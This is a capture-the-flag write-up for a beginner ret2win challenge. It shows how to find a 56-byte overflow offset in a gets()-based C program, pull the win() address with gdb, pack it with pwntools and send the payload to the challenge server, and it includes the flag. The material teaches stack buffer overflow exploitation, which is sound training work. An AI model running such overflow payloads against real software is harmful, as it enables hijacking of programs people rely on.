Coming Soon!
**Please call 1-500-WIN to get the flag!**

> Category: Pwn
>
> You might have heard of buffer overflows, but do you know how to exploit them?
> 
> The goal of this challenge is to overwrite main's return pointer which is stored on the stack, with the address of the win() function. There are several good (and > bad) tutorials on how to do this online. Googeling for example ret2win or binary exploitation buffer overflow might be a good place to start.
> 
> nc io.ept.gg 30022

We are given a c-file (pwn2.c in this directory).
By looking at the **main**-function, we can see that the program uses gets(), which is vulnerable to a buffer overflow.
We also see that there is a function, **win**, which prints out the flag if we can get it to run.
We can overwrite the return address to return to the **win**-function, to print out the flag.


# Breaking the program  #
First we need to find out when the program breaks. We see that the buffer gets() writes into is 40 bytes. We try to write different amount of 'A's to find out exactly when the program breaks. 
```
python3 -c "print('A'*60)" | ./pwn2
Enter some text: 
Segmentation fault (core dumped)
```
We can see that the program seg-faults when we write 60 bytes. By trying some more we find out that the program seg-fauls at 57 bytes, but not 56. This means that at byte 57 we start overwriting the return address in EIP.

We must know the funciton-address of the win-function we want the program to run. We can use gdb to find the function-address.
We set a breakpoint in the program at the main function, and disassemble the win function.
```
> b main 
> run
> disass win
```
> 0x0000000000401314 <+0>:	endbr64 
> 
> 0x0000000000401318 <+4>:	push   %rbp
> 
> 0x0000000000401319 <+5>:	mov    %rsp,%rbp
> 
> 0x000000000040131c <+8>:	sub    $0x110,%rsp

We see that the win-function has the address 0x401314, which is the value we want to write into the EIP-register.

We cannot write 401314 directly into the EIP-register, because we need padding (also endian notation). We can use pwntools to do the 64-bit padding and endian notation for use:
```
>>> from pwn import *
>>> p64(0x401314)
b'\x14\x13@\x00\x00\x00\x00\x00'
```
We now have the amount of 'A's to reach the point where we write over the EIP-register, we also have the address to write into that register. 
We combine the two together and get the following:

``` 
python3 -c "print('A'*56 + '\x14\x13@\x00\x00\x00\x00\x00')" | nc io.ept.gg 30022
```

We get out the flag:
> EPT{congratulations_y0u_win!}
